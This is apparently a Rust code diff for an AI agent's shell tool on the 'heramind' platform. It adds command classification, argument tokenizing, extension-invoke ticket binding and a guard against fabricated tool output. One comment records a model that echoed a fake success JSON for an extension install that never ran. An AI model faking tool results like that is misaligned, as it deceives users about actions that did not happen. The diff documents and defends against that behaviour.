+                // clap `--help` in its own `usage_hint` JSON field (never
+                // concatenated onto `stdout` or `stderr`). Preserve exit_code 2
+                // so Phase 1's pre-submission rejection classifier matches.
+                let usage_hint = {
+                    // Prefer domain_action_from_argv so globals between
+                    // domain/action (`heramind extension --json config …`) still
+                    // resolve the real subcommand for clap help + contract.
+                    if let Some((domain, action)) =
+                        heramind_cli_ops::json_arg::domain_action_from_argv(&argv)
+                    {
+                        Self::in_process_domain_help(
+                            domain,
+                            Some(action),
+                            "retry with the exact one",
+                        )
+                        .or_else(|| {
+                            heramind_cli_ops::json_arg::find_domain_command_contract(domain, action)
+                                .map(|c| c.format_hint())
+                        })
+                    } else {
+                        let domain_idx =
+                            heramind_cli_ops::json_arg::domain_token_index(&argv).unwrap_or(1);
+                        argv.get(domain_idx).and_then(|domain| {
+                            let subcommand = argv
+                                .get(domain_idx + 1)
+                                .map(String::as_str)
+                                .filter(|s| !s.starts_with('-'));
+                            Self::in_process_domain_help(
+                                domain.as_str(),
+                                subcommand,
+                                "retry with the exact one",
+                            )
+                            .or_else(|| {
+                                subcommand.and_then(|action| {
+                                    heramind_cli_ops::json_arg::find_domain_command_contract(
+                                        domain.as_str(),
+                                        action,
+                                    )
+                                    .map(|c| c.format_hint())
+                                })
+                            })
+                            .or_else(|| {
+                                if domain_index.is_none() {
+                                    Some(format!(
+                                        "Unknown domain `{}`. Valid domains: device, agent, rule, dashboard, connector, extension, transform, widget, message, push, llm, settings, system, api-key.",
+                                        domain
+                                    ))
+                                } else {
+                                    None
+                                }
+                            })
+                        })
+                    }
+                };
                 Some(CommandOutput {
                     exit_code: Some(2),
                     stdout: String::new(),
                     stderr,
                     timed_out: false,
+                    domain_index,
+                    usage_hint,
                 })
             }
-            Ok(Err(heramind_cli_ops::dispatch::DispatchError::Api(msg))) => Some(CommandOutput {
-                exit_code: Some(1),
-                stdout: String::new(),
-                stderr: msg,
-                timed_out: false,
-            }),
+            Ok(Err(heramind_cli_ops::dispatch::DispatchError::Api(msg))) => {
+                let domain_index = self.take_domain_index_once();
+                Some(CommandOutput {
+                    exit_code: Some(1),
+                    stdout: String::new(),
+                    stderr: classify_extension_transport_error(&msg),
+                    timed_out: false,
+                    domain_index,
+                    usage_hint: None,
+                })
+            }
             // Timeout (outer Err = elapsed) — mirror the subprocess timeout behavior.
-            Err(_) => Some(CommandOutput {
-                exit_code: None,
-                stdout: String::new(),
-                stderr: format!("Command timed out after {}s", timeout.as_secs()),
-                timed_out: true,
-            }),
+            Err(_) => Some(CommandOutput::plain(
+                None,
+                String::new(),
+                format!("Command timed out after {}s", timeout.as_secs()),
+                true,
+            )),
         }
     }
 
@@ -513,12 +930,34 @@ impl ShellTool {
         working_dir: Option<&str>,
         timeout: Duration,
     ) -> Result<CommandOutput> {
+        // [fabricated-output guard] A small model asked to install an
+        // extension once answered by ECHOING a fake tool-result JSON
+        // ("exit_code":0 ... "command":"heramind extension install X" ...
+        // "message":"Installed extension") instead of running the real
+        // command (2026-10-15) — the user was told the install succeeded
+        // when nothing happened. Printing a tool-result-shaped payload via
+        // echo/printf is never legitimate agent behavior: refuse it and
+        // name the cure.
+        if let Some(real_cmd) = fabricated_tool_output(command) {
+            return Ok(CommandOutput::plain(
+                Some(126),
+                format!(
+                    "FABRICATED TOOL OUTPUT REFUSED: this command prints a fake tool-result \
+                     JSON (exit_code/command/stdout keys) instead of executing the real \
+                     action — that reports success for something that never ran. Execute the \
+                     real command instead: `{real_cmd}`"
+                ),
+                String::new(),
+                false,
+            ));
+        }
+
         // Fast path: route `heramind` data commands through the in-process
         // dispatcher so the agent gets structured `CliResponse` directly,
         // without depending on whatever `heramind` binary happens to be in
         // PATH (eliminates version drift between the running server and the
-        // CLI binary). Side-effecting/interactive/local-only commands return
-        // `NotInProcess` and fall through to the subprocess path below.
+        // CLI binary). `NotInProcess` (list-models/logs/…) spawns the already
+        // parsed argv — never re-shells the raw string (quoted `$()`).
         if let Some(output) = self.try_in_process_dispatch(command, timeout).await {
             return Ok(output);
         }
@@ -642,12 +1081,7 @@ impl ShellTool {
                 } else {
                     stdout
                 };
-                Ok(CommandOutput {
-                    exit_code: status.code(),
-                    stdout,
-                    stderr,
-                    timed_out: false,
-                })
+                Ok(CommandOutput::plain(status.code(), stdout, stderr, false))
             }
             Ok(Err(e)) => {
                 // Pipe/wait error — let guard's Drop handle cleanup so we
@@ -667,12 +1101,12 @@ impl ShellTool {
                     let _ = child.wait().await;
                 }
                 guard.child = None;
-                Ok(CommandOutput {
-                    exit_code: None,
-                    stdout: String::new(),
-                    stderr: format!("Command timed out after {}s", timeout.as_secs()),
-                    timed_out: true,
-                })
+                Ok(CommandOutput::plain(
+                    None,
+                    String::new(),
+                    format!("Command timed out after {}s", timeout.as_secs()),
+                    true,
+                ))
             }
         }
     }
@@ -927,19 +1361,532 @@ fn apply_truncation_pipeline(
     output
 }
 
-/// Tokenize a `heramind` command line into an argv vector, respecting single
-/// and double quotes and backslash escapes.
+/// Classify a shell command line for the mutating write gate.
 ///
-/// This is NOT a full shell parser — it deliberately ignores pipes,
-/// redirections, `$` expansions, and command separators. Simple truncation
-/// pipes (`| head -100`) are handled one level up by
-/// [`split_truncation_pipeline`]; anything else is left for the real shell
-/// (subprocess path) to interpret.
+/// - Platform CLI (`heramind …`): capability from **parsed** command type
+///   (only proven query variants are read-only).
+/// - Compound / non-CLI / unparseable: [`ToolCapability::mutating_unknown_sensitive`]
+///   — absence of a write keyword is **not** proof of read-only.
+pub(crate) fn classify_shell_capability(
+    cmd: &str,
+) -> crate::agent::task_continuity::ToolCapability {
+    classify_shell_capability_with_args(cmd, &serde_json::json!({}))
+}
+
+/// Classify a shell tool call using both `command` and structured `args`
+/// (e.g. `params`). Strips leaked host-meta tokens (`_new_operation`,
+/// `--prepared-operation-id`) before clap parsing so a read-only query does
+/// not degrade into `mutating_unknown_sensitive`, and reflects structured
+/// `params` (e.g. `extension config <id>` + `params` → `Mutating`).
+pub(crate) fn classify_shell_capability_with_args(
+    cmd: &str,
+    args: &Value,
+) -> crate::agent::task_continuity::ToolCapability {
+    use crate::agent::task_continuity::ToolCapability;
+    use heramind_cli_ops::dispatch::CliSideEffect;
+
+    let trimmed = cmd.trim();
+    if trimmed.is_empty() {
+        return ToolCapability::mutating_unknown_sensitive();
+    }
+
+    // Compound sequencing: unknown part ⇒ unknown; else any mutate ⇒ mutate.
+    if let Some(parts) = split_shell_sequence(trimmed) {
+        if parts.len() > 1 {
+            use crate::agent::task_continuity::RetryPolicy;
+            let mut any_mutating = false;
+            for part in &parts {
+                let cap = classify_shell_capability_with_args(part, args);
+                match cap.retry_policy {
+                    RetryPolicy::Never => {
+                        return ToolCapability::mutating_unknown_sensitive();
+                    }
+                    RetryPolicy::OnFailure { .. } => any_mutating = true,
+                    RetryPolicy::AlwaysSafe => {}
+                }
+            }
+            return if any_mutating {
+                ToolCapability::mutating_write()
+            } else {
+                ToolCapability::read_query()
+            };
+        }
+    }
+
+    // Peel safe truncation pipelines (`… 2>&1 | head -N`) before CLI parse.
+    let base = match split_truncation_pipeline(trimmed) {
+        Some((b, _, _)) => b,
+        None => {
+            // Unsupported pipe/redir → unknown side-effects (not keyword RO).
+            return ToolCapability::mutating_unknown_sensitive();
+        }
+    };
+
+    let base_trim = base.trim();
+    if !(base_trim == "heramind" || base_trim.starts_with("heramind ")) {
+        return ToolCapability::mutating_unknown_sensitive();
+    }
+
+    let argv = match tokenize_heramind_command(base_trim) {
+        Ok(a) => a,
+        Err(_) => return ToolCapability::mutating_unknown_sensitive(),
+    };
+    // Strip leaked host-meta tokens (`_new_operation=true`, `--_new_operation`,
+    // `--prepared-operation-id`) before clap classification so a read-only
+    // query is never downgraded to `mutating_unknown_sensitive`.
+    let mut argv = strip_host_meta_from_argv(argv);
+
+    // Reflect structured shell `params` onto the command's primary JSON flag
+    // for classification (e.g. `extension config <id>` with `params` is a write,
+    // while bare `extension config <id>` is read-only).
+    if let Some(params_val) = args.get("params").filter(|v| v.is_object() || v.is_array()) {
+        if let Some(spec) = heramind_cli_ops::json_arg::primary_json_spec(&argv) {
+            let file_flag = format!("{}-file", spec.flag);
+            if !argv
+                .iter()
+                .any(|a| a == spec.flag || a.as_str() == file_flag)
+            {
+                argv.push(spec.flag.to_string());
+                argv.push(params_val.to_string());
+            }
+        }
+    }
+
+    match heramind_cli_ops::dispatch::classify_argv(&argv) {
+        Ok(CliSideEffect::ProvenReadOnly) => ToolCapability::read_query(),
+        Ok(CliSideEffect::Mutating) => ToolCapability::mutating_write(),
+        Err(_) => ToolCapability::mutating_unknown_sensitive(),
+    }
+}
+
+/// Split `&&` / `;` sequences (first separator wins), ignoring empties.
+fn split_shell_sequence(trimmed: &str) -> Option<Vec<String>> {
+    let has_sep = trimmed.contains("&&") || trimmed.contains(';');
+    if !has_sep {
+        return None;
+    }
+    let sep = if let Some(amp) = trimmed.find("&&") {
+        if let Some(semi) = trimmed.find(';') {
+            if semi < amp {
+                ";"
+            } else {
+                "&&"
+            }
+        } else {
+            "&&"
+        }
+    } else {
+        ";"
+    };
+    let parts: Vec<String> = trimmed
+        .split(sep)
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .map(str::to_string)
+        .collect();
+    if parts.len() > 1 {
+        Some(parts)
+    } else {
+        None
+    }
+}
+
+/// Policy pin: after a successful argv tokenize, `NotInProcess` must spawn
+/// that argv — never `/bin/sh -c` of the raw line (quoted `$()` expands).
+pub(crate) fn not_in_process_uses_parsed_argv() -> bool {
+    true
+}
+
+/// NM-240/247: for `extension invoke`, claim the **classify-time** PreparedInvoke
+/// (never re-prepare) exclusively from the host-managed [`ExtensionInvokeHostContext`].
+/// `strip_host_meta_from_argv` already removes any model-supplied
+/// `--prepared-operation-id` tokens before this point, so argv never carries a
+/// ticket. Missing/stale → "not executed; resubmit business call".
+pub(crate) fn bind_extension_invoke_prepared_token(
+    argv: Vec<String>,
+) -> std::result::Result<Vec<String>, String> {
+    use clap::Parser;
+    use heramind_cli_ops::dispatch::commands::{Args, Command, ExtensionCommand};
+
+    let host = heramind_cli_ops::dispatch::peek_extension_invoke_host_context();
+    let host_op = host.as_ref().and_then(|h| h.prepared_operation_id.clone());
+    let ticket_stripped = host
+        .as_ref()
+        .map(|h| h.ticket_stripped_without_restore)
+        .unwrap_or(false);
+    let host_params = host.and_then(|h| h.structured_params);
+
+    let Some(op_id) = host_op else {
+        let parsed = match Args::try_parse_from(argv.iter()) {
+            Ok(a) => a,
+            Err(_) => return Ok(argv),
+        };
+        return match parsed.command {
+            Command::Extension {
+                extension_cmd:
+                    ExtensionCommand::Invoke {
+                        extension_id,
+                        command,
+                        params,
+                        ..
+                    },
+            } => {
+                let tip = extension_invoke_params_retry_tip();
+                let params_unparseable = match params.as_deref() {
+                    Some(s) => serde_json::from_str::<serde_json::Value>(s).is_err(),
+                    None => false,
+                };
+                if params_unparseable {
+                    tracing::warn!(
+                        extension_id = %extension_id,
+                        command = %command,
+                        stage = "shell_bind",
+                        "PreparedInvoke missing — invoke --params is not valid JSON"
+                    );
+                    return Err(format!(
+                        "could not parse invoke params for '{extension_id}/{command}' — {tip}"
+                    ));
+                }
+                if ticket_stripped {
+                    tracing::warn!(
+                        extension_id = %extension_id,
+                        command = %command,
+                        stage = "shell_bind",
+                        "PreparedInvoke missing at Shell bind — host ticket was present then                          stripped at execute canonicalize without restore"
+                    );
+                    Err(format!(
+                        "PreparedInvoke missing for '{extension_id}/{command}' — not executed;                          host ticket was stripped at execute canonicalize without restore.                          Resubmit the business call (command + params). Do not invent                          prepared-operation tickets."
+                    ))
+                } else {
+                    tracing::warn!(
+                        extension_id = %extension_id,
+                        command = %command,
+                        stage = "shell_bind",
+                        "PreparedInvoke missing at Shell bind — host context had no ticket                          (never minted at classify)"
+                    );
+                    Err(format!(
+                        "PreparedInvoke missing for '{extension_id}/{command}' — not executed;                          no ticket was minted at classify. Resubmit the business call                          (prefer shell `params` object). Do not invent prepared-operation tickets. {tip}"
+                    ))
+                }
+            }
+            _ => Ok(argv),
+        };
+    };
+    tracing::debug!(
+        prepared_operation_id = %op_id,
+        stage = "shell_bind",
+        "claiming PreparedInvoke for Shell → HTTP consume"
+    );
+
+    // Ownership check: prefer host structured params, else argv --params.
+    let ownership = (|| {
+        let parsed = Args::try_parse_from(argv.iter()).ok()?;
+        let Command::Extension {
+            extension_cmd:
+                ExtensionCommand::Invoke {
+                    extension_id,
+                    command,
+                    params,
+                    params_file,
+                    ..
+                },
+        } = parsed.command
+        else {
+            return None;
+        };
+        let raw = if let Some(v) = host_params.clone() {
+            if v.is_null() {
+                serde_json::json!({})
+            } else {
+                v
+            }
+        } else if let Some(path) = params_file.as_ref() {
+            let text = std::fs::read_to_string(path).ok()?;
+            serde_json::from_str(text.trim()).ok()?
+        } else {
+            match params.as_deref() {
+                None => serde_json::json!({}),
+                Some(s) => serde_json::from_str(s).ok()?,
+            }
+        };
+        Some((extension_id, command, raw))
+    })();
+
+    match ownership {
+        Some((ext_id, command, raw)) => {
+            heramind_core::extension::claim_prepared_for_dispatch(&op_id, &ext_id, &command, &raw)
+                .map_err(|e| {
+                    format!(
+                        "PreparedInvoke stale or unbound ('{op_id}'): {e} — not executed; \
+                         resubmit the business call (command + params). Do not invent \
+                         or reuse prepared-operation tickets."
+                    )
+                })?;
+        }
+        None => {
+            heramind_core::extension::claim_prepared_by_id(&op_id).map_err(|e| {
+                format!(
+                    "PreparedInvoke stale or unbound ('{op_id}'): {e} — not executed; \
+                     resubmit the business call (command + params). Do not invent \
+                     or reuse prepared-operation tickets."
+                )
+            })?;
+        }
+    }
+    Ok(argv)
+}
+
+/// Reject when shell `params` conflicts with the command's primary JSON flag
+/// (`--params`/`--set`/`--components`/`--ids`/`--body`/`--input`/`--config`),
+/// or when `params` has the wrong JSON container kind (object vs array).
+pub fn validate_extension_params_sources(args: &Value) -> std::result::Result<(), String> {
+    let Some(params_val) = args.get("params") else {
+        return Ok(());
+    };
+    if params_val.is_null() {
+        return Ok(());
+    }
+    if !params_val.is_object() && !params_val.is_array() {
+        return Err(
+            "shell params must be a JSON object or array (primary JSON payload for --params/--set/--components/--ids/--body/--input/--config)"
+                .into(),
+        );
+    }
+    let cmd = args
+        .get("command")
+        .and_then(|v| v.as_str())
+        .unwrap_or("")
+        .trim();
+    if cmd.is_empty() {
+        return Ok(());
+    }
+    let argv = tokenize_heramind_command(cmd).map_err(|e| e.to_string())?;
+    let argv = strip_host_meta_from_argv(argv);
+    if let Some(contract) = heramind_cli_ops::json_arg::find_domain_command_contract_for_argv(&argv)
+    {
+        contract.validate_primary_json(params_val)?;
+    }
+    let Some(spec) = heramind_cli_ops::json_arg::primary_json_spec(&argv) else {
+        // Structured params with no known primary flag — ignore (legacy callers).
+        return Ok(());
+    };
+    match spec.kind {
+        heramind_cli_ops::json_arg::ExpectedJsonKind::Object if !params_val.is_object() => {
+            return Err(format!(
+                "shell params for `{}` must be a JSON object",
+                spec.flag
+            ));
+        }
+        heramind_cli_ops::json_arg::ExpectedJsonKind::Array if !params_val.is_array() => {
+            return Err(format!(
+                "shell params for `{}` must be a JSON array",
+                spec.flag
+            ));
+        }
+        _ => {}
+    }
+    let flag = spec.flag;
+    let file_flag = format!("{flag}-file");
+    if argv.iter().any(|a| a == flag || a.as_str() == file_flag) {
+        return Err(format!(
+            "conflict: pass JSON via shell `params` OR `{flag}` in command — not both"
+        ));
+    }
+    Ok(())
+}
+
+fn extension_invoke_host_context_from_args(
+    args: &Value,
+) -> Option<heramind_cli_ops::dispatch::ExtensionInvokeHostContext> {
+    let cmd = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
+    let ticket = args
+        .get(crate::agent::task_continuity::HOST_PREPARED_OPERATION_ARG)
+        .and_then(|v| v.as_str())
+        .map(str::to_string);
+    let structured = args.get("params").and_then(|v| {
+        if v.is_object() || v.is_array() {
+            Some(v.clone())
+        } else if v.is_null() {
+            Some(serde_json::json!({}))
+        } else {
+            None
+        }
+    });
+    let stripped = args
+        .get(crate::agent::task_continuity::HOST_TICKET_STRIPPED_ARG)
+        .and_then(|v| v.as_bool())
+        .unwrap_or(false);
+    // Prepared ticket only applies to extension invoke; structured JSON applies
+    // to any primary-JSON-flag command.
+    let is_invoke = cmd.contains("extension invoke") || cmd.contains("extension  invoke");
+    if ticket.is_none() && structured.is_none() && !(stripped && is_invoke) {
+        return None;
+    }
+    Some(heramind_cli_ops::dispatch::ExtensionInvokeHostContext {
+        // Drop ticket for non-invoke — never leak into unrelated domains.
+        prepared_operation_id: if is_invoke { ticket } else { None },
+        structured_params: structured,
+        ticket_stripped_without_restore: stripped && is_invoke,
+    })
+}
+
+/// Strip Chat lifecycle / PreparedInvoke tokens from argv before clap.
 ///
-/// The first token is expected to be `heramind`. Returns an error if the input
-/// has unbalanced quotes (so the caller can fall back to the subprocess and
-/// surface the real shell error message).
-fn tokenize_heramind_command(input: &str) -> std::result::Result<Vec<String>, String> {
+/// Models sometimes append `_new_operation=true` or `--_new_operation` inside
+/// the `command` string. Those are tool-schema fields, never CLI flags.
+pub(crate) fn strip_host_meta_from_argv(argv: Vec<String>) -> Vec<String> {
+    let mut out = Vec::with_capacity(argv.len());
+    let mut i = 0;
+    while i < argv.len() {
+        let tok = argv[i].as_str();
+        if is_host_meta_token(tok) {
+            i += 1;
+            continue;
+        }
+        if tok == "--prepared-operation-id" {
+            i += 1;
+            if i < argv.len() {
+                i += 1;
+            }
+            continue;
+        }
+        if let Some(rest) = tok.strip_prefix("--prepared-operation-id=") {
+            let _ = rest;
+            i += 1;
+            continue;
+        }
+        out.push(argv[i].clone());
+        i += 1;
+    }
+    out
+}
+
+fn is_host_meta_token(tok: &str) -> bool {
+    matches!(
+        tok,
+        "_new_operation"
+            | "_new_operation=true"
+            | "_new_operation=false"
+            | "--_new_operation"
+            | "--_new_operation=true"
+            | "--_new_operation=false"
+            | crate::agent::task_continuity::HOST_PREPARED_OPERATION_ARG
+            | crate::agent::task_continuity::PREPARED_OPERATION_ARG
+    ) || tok.starts_with("_new_operation=")
+        || tok.starts_with("--_new_operation=")
+        || tok.starts_with(&format!(
+            "{}=",
+            crate::agent::task_continuity::HOST_PREPARED_OPERATION_ARG
+        ))
+        || tok.starts_with(&format!(
+            "{}=",
+            crate::agent::task_continuity::PREPARED_OPERATION_ARG
+        ))
+}
+
+/// Inject host structured JSON as the command's primary JSON flag argv pair.
+fn inject_structured_json_argv(argv: Vec<String>) -> std::result::Result<Vec<String>, String> {
+    let host = heramind_cli_ops::dispatch::peek_extension_invoke_host_context();
+    let Some(params) = host.and_then(|h| h.structured_params) else {
+        return Ok(argv);
+    };
+    let Some(flag) = heramind_cli_ops::json_arg::primary_json_flag(&argv) else {
+        return Ok(argv);
+    };
+    let file_flag = format!("{flag}-file");
+    if argv.iter().any(|a| a == flag || a.as_str() == file_flag) {
+        // validate_extension_params_sources should have caught this; keep
+        // host params preferred by dropping the CLI flag pair.
+        let mut cleaned = Vec::with_capacity(argv.len());
+        let mut i = 0;
+        while i < argv.len() {
+            if argv[i] == flag || argv[i] == file_flag {
+                i += 2;
+                continue;
+            }
+            cleaned.push(argv[i].clone());
+            i += 1;
+        }
+        let mut out = cleaned;
+        out.push(flag.to_string());
+        out.push(params.to_string());
+        return Ok(out);
+    }
+    let mut out = argv;
+    out.push(flag.to_string());
+    out.push(params.to_string());
+    Ok(out)
+}
+
+/// Annotate localhost API transport failures so PreferKnown / recovery can
+/// distinguish transport from extension business errors (NM-247 / 10:50 weather).
+///
+/// Kind comes from [`heramind_cli_ops::ApiClient`] prefixes (`http_timeout:` /
+/// `http_connect:` / `http_transport:`) when available:
+/// - **connect refuse** → not submitted (body not reached)
+/// - **timeout / ambiguous send** → result unknown (request may have been
+///   accepted; do not claim "not executed" or auto-resend)
+fn classify_extension_transport_error(msg: &str) -> String {
+    let lower = msg.to_lowercase();
+    let local = lower.contains("9375")
+        || lower.contains("localhost")
+        || lower.contains("127.0.0.1")
+        || lower.contains("/api/extensions/")
+        || lower.starts_with("http_timeout:")
+        || lower.starts_with("http_connect:")
+        || lower.starts_with("http_transport:");
+    if !local {
+        return msg.to_string();
+    }
+
+    let is_timeout = lower.starts_with("http_timeout:")
+        || lower.contains("http_timeout:")
+        || ((lower.contains("timed out") || lower.contains("timeout"))
+            && !lower.contains("http_connect:"));
+    let is_connect = lower.starts_with("http_connect:")
+        || lower.contains("http_connect:")
+        || lower.contains("connection refused")
+        || lower.contains("connect error")
+        || lower.contains("failed to connect")
+        || lower.contains("dns error");
+    let looks_transport = is_timeout
+        || is_connect
+        || lower.starts_with("http_transport:")
+        || lower.contains("error sending request");
+
+    if !looks_transport {
+        return msg.to_string();
+    }
+
+    if is_connect && !is_timeout {
+        format!(
+            "transport error (localhost API): {msg}. \
+             Stage=transport — connection failed before submit; extension \
+             business body was not reached (not submitted). PreferKnown of \
+             this failure is not a new execution; retry the business call \
+             after the API is reachable."
+        )
+    } else {
+        // Timeout or ambiguous send: request may already have hit the server.
+        format!(
+            "transport error (localhost API): {msg}. \
+             Stage=transport — result unknown (request may already have been \
+             submitted; do not assume 'not executed'). PreferKnown of a prior \
+             failure is not a new execution. Before `_new_operation`, check \
+             ledger / inquire status / re-auth; do not auto-resend on timeout alone."
+        )
+    }
+}
+
+/// Tokenize a pure `heramind …` line for clap / capability classification.
+///
+/// Rejects shell constructs (`|<>$\``) outside quotes so compound / piped
+/// lines are not mis-parsed as CLI argv.
+///
+/// NM-302: after a primary JSON flag (`--params`/`--set`/…), a bare `{…}` /
+/// `[…]` value keeps internal `"` as JSON string literals (Spark/small models
+/// often omit the outer quotes around the JSON object).
+pub(crate) fn tokenize_heramind_command(input: &str) -> std::result::Result<Vec<String>, String> {
     // Shell-construct guard: a pipe / redirection / command-substitution char
     // OUTSIDE quotes means this is a real shell command line, not a pure
     // `heramind` invocation — bail so the caller routes it to the subprocess
@@ -990,6 +1937,16 @@ fn tokenize_heramind_command(input: &str) -> std::result::Result<Vec<String>, St
             c if c.is_whitespace() && !in_single && !in_double => {
                 if !current.is_empty() {
                     tokens.push(std::mem::take(&mut current));
+                    // After a primary JSON flag, consume a bare `{…}` / `[…]`
+                    // blob with internal quotes preserved as literals.
+                    if is_primary_json_cli_flag(tokens.last().map(String::as_str).unwrap_or("")) {
+                        while matches!(chars.peek(), Some(ch) if ch.is_whitespace()) {
+                            chars.next();
+                        }
+                        if matches!(chars.peek(), Some('{' | '[')) {
+                            tokens.push(take_json_value_blob(&mut chars)?);
+                        }
+                    }
                 }
             }
             _ => current.push(c),
@@ -1003,6 +1960,124 @@ fn tokenize_heramind_command(input: &str) -> std::result::Result<Vec<String>, St
         tokens.push(current);
     }
     Ok(tokens)
+}
+
+fn is_primary_json_cli_flag(tok: &str) -> bool {
+    matches!(
+        tok,
+        "--params" | "--set" | "--body" | "--components" | "--ids" | "--config" | "--input"
+    )
+}
+
+/// Consume one JSON object/array token starting at `{` or `[`, preserving
+/// internal `"` as string literals (depth-aware; respects JSON escapes).
+fn take_json_value_blob(
+    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
+) -> std::result::Result<String, String> {
+    let Some(start) = chars.next() else {
+        return Err("expected JSON value".into());
+    };
+    if start != '{' && start != '[' {
+        return Err("expected JSON object or array".into());
+    }
+    let mut out = String::from(start);
+    let mut depth: i32 = 1;
+    let mut in_string = false;
+    let mut escape = false;
+    while let Some(&c) = chars.peek() {
+        chars.next();
+        out.push(c);
+        if in_string {
+            if escape {
+                escape = false;
+            } else if c == '\\' {
+                escape = true;
+            } else if c == '"' {
+                in_string = false;
+            }
+            continue;
+        }
+        match c {
+            '"' => in_string = true,
+            '{' | '[' => depth += 1,
+            '}' | ']' => {
+                depth -= 1;
+                if depth == 0 {
+                    return Ok(out);
+                }
+            }
+            _ => {}
+        }
+    }
+    Err("unbalanced JSON value after primary JSON flag".into())
+}
+
+/// Preferred Chat/shell tip when extension invoke `--params` cannot be parsed.
+pub(crate) fn extension_invoke_params_retry_tip() -> String {
+    ShellTool::structured_params_retry_tip("extension", Some("invoke")).unwrap_or_else(|| {
+        "use shell `params` object or quoted --params '{\"city\":\"…\"}'. \
+         Example shape: {\"command\":\"heramind extension invoke <id> <command>\", \
+         \"params\":{\"city\":\"Xiamen\"}}"
+            .to_string()
+    })
+}
+/// Build the stderr text for a clap parse failure.
+///
+/// clap's own `Display` already prefixes `error: ...`, so the wrapper adds
+/// its own prefix only when missing — the 2026-11-08 eval batch archived
+/// doubled `error: error: unexpected argument ...` stderr from the
+/// unconditional prefix. For the `rule create` fast-path/JSON flag conflict,
+/// append an either-or hint (the clap contract itself is unchanged).
+fn parse_error_stderr(parse_error: &str) -> String {
+    let mut stderr = if parse_error.starts_with("error:") {
+        parse_error.to_string()
+    } else {
+        format!("error: {parse_error}")
+    };
+    if parse_error.contains("cannot be used with")
+        && parse_error.contains("--name")
+        && parse_error.contains("--body")
+    {
+        stderr.push_str(
+            "\nHint: choose ONE form — fast path: --name <N> --trigger-device <D> \
+             --metric <M> --operator <OP> --threshold <V>; or full JSON rule: \
+             --body '<rule JSON>'. `heramind rule create --help` shows both.",
+        );
+    }
+    stderr
+}
+
+/// Conservatively recognize the split-path parse failure without guessing at
+/// arbitrary extra words. Tokenization preserves quoted/escaped spaces inside
+/// one argument, so only adjacent, whitespace-free path fragments qualify.
+fn should_hint_split_path(parse_error: &str, argv: &[String]) -> bool {
+    let Some((_, rest)) = parse_error.split_once("unexpected argument '") else {
+        return false;
+    };
+    let Some((unexpected, _)) = rest.split_once('\'') else {
+        return false;
+    };
+    let rooted = |s: &str| {
+        s.starts_with('/')
+            || s.starts_with("./")
+            || s.starts_with("../")
+            || s.starts_with("~/")
+            || s.starts_with("\\\\")
+            || (s.as_bytes().get(1) == Some(&b':')
+                && matches!(s.as_bytes().get(2), Some(b'/' | b'\\')))
+    };
+    // A bare extra word is ambiguous; a second independent absolute path is
+    // not evidence that it belongs to the preceding argument either.
+    if unexpected.starts_with('-')
+        || unexpected.chars().any(char::is_whitespace)
+        || !unexpected.contains(['/', '\\'])
+        || rooted(unexpected)
+    {
+        return false;
+    }
+    argv.windows(2).any(|pair| {
+        pair[1] == unexpected && rooted(&pair[0]) && !pair[0].chars().any(char::is_whitespace)
+    })
 }
 
 /// Truncate stdout + stderr to fit within max_total chars, with truncation notices.
@@ -1066,21 +2141,106 @@ fn find_safe_truncation_point(s: &str, max_bytes: usize) -> usize {
     pos
 }
 
+/// When the model invents CLI `--params` on a command whose primary JSON flag
+/// is something else (`--components`, `--set`, `--ids`, `--body`, `--config`,
+/// `--input`), point it at shell structured `params` instead of clap noise.
+fn misplaced_primary_json_flag_tip(domain: &str, action: &str, argv: &[String]) -> Option<String> {
+    let has_params_flag = argv
+        .iter()
+        .any(|t| t == "--params" || t.starts_with("--params="));
+    if !has_params_flag || domain.is_empty() || action.is_empty() {
+        return None;
+    }
+    let probe = vec![
+        "heramind".to_string(),
+        domain.to_string(),
+        action.to_string(),
+    ];
+    let spec = heramind_cli_ops::json_arg::primary_json_spec(&probe)?;
+    if spec.flag == "--params" {
+        // Legitimate CLI flag for extension invoke / device control.
+        return None;
+    }
+    let shape = match spec.kind {
+        heramind_cli_ops::json_arg::ExpectedJsonKind::Array => "[...]",
+        heramind_cli_ops::json_arg::ExpectedJsonKind::Object => "{...}",
+    };
+    Some(format!(
+        "`{domain} {action}` does not take CLI `--params`. Prefer shell tool: \
+         command=\"heramind {domain} {action} ...\", params={shape} \
+         (maps to `{flag}`). Do not invent `--params` inside the command string. \
+         Human CLI fallback: `{flag} '<JSON>`.",
+        flag = spec.flag
+    ))
+}
+
 // ============================================================================
 // Error Recovery Hints
 // ============================================================================
+
+/// Return `true` when `stdout` is a JSON `CliResponse` / error payload that
+/// already carries a non-empty `suggestion` or `hint` (at top level, under
+/// `error`, or under `data`). Since Phase 2 keeps `stdout` pure JSON, we parse
+/// it directly instead of substring-matching raw text.
+fn stdout_has_server_guidance(stdout: &str) -> bool {
+    fn non_empty_str(v: &serde_json::Value, key: &str) -> bool {
+        v.get(key)
+            .and_then(|s| s.as_str())
+            .is_some_and(|s| !s.trim().is_empty())
+    }
+    fn obj_has_guidance(v: &serde_json::Value) -> bool {
+        non_empty_str(v, "suggestion") || non_empty_str(v, "hint")
+    }
+    let trimmed = stdout.trim();
+    if trimmed.is_empty() {
+        return false;
+    }
+    let Ok(val) = serde_json::from_str::<serde_json::Value>(trimmed) else {
+        return false;
+    };
+    obj_has_guidance(&val)
+        || val.get("error").is_some_and(obj_has_guidance)
+        || val.get("data").is_some_and(obj_has_guidance)
+}
+
+/// Return `true` when `stderr` already carries a server-originated `Hint:`
+/// line extracted from `ErrorResponse.hint` by `ApiClient`.
+fn stderr_has_server_guidance(stderr: &str) -> bool {
+    stderr.lines().any(|line| {
+        line.trim_start()
+            .strip_prefix("Hint:")
+            .is_some_and(|rest| !rest.trim().is_empty())
+    })
+}
+
+/// True for targeted parse-error hints that add value alongside clap's
+/// in-process `usage_hint` (as opposed to broad domain action summaries).
+fn is_targeted_parse_hint(hint: &str) -> bool {
+    hint.starts_with("ID is a positional argument")
+        || hint.starts_with("Device-defined command parameters")
+        || hint.contains("does not take CLI `--params`")
+}
 
 impl ShellTool {
     /// Generate a recovery hint when a heramind CLI command fails.
     fn recovery_hint(command: &str, stdout: &str, stderr: &str) -> Option<String> {
         let cmd = command.trim();
-        if !cmd.starts_with("heramind ") {
+        let argv = tokenize_heramind_command(cmd)
+            .unwrap_or_else(|_| cmd.split_whitespace().map(str::to_string).collect());
+        let argv = strip_host_meta_from_argv(argv);
+        if argv.first().map(String::as_str) != Some("heramind") {
             return None;
         }
 
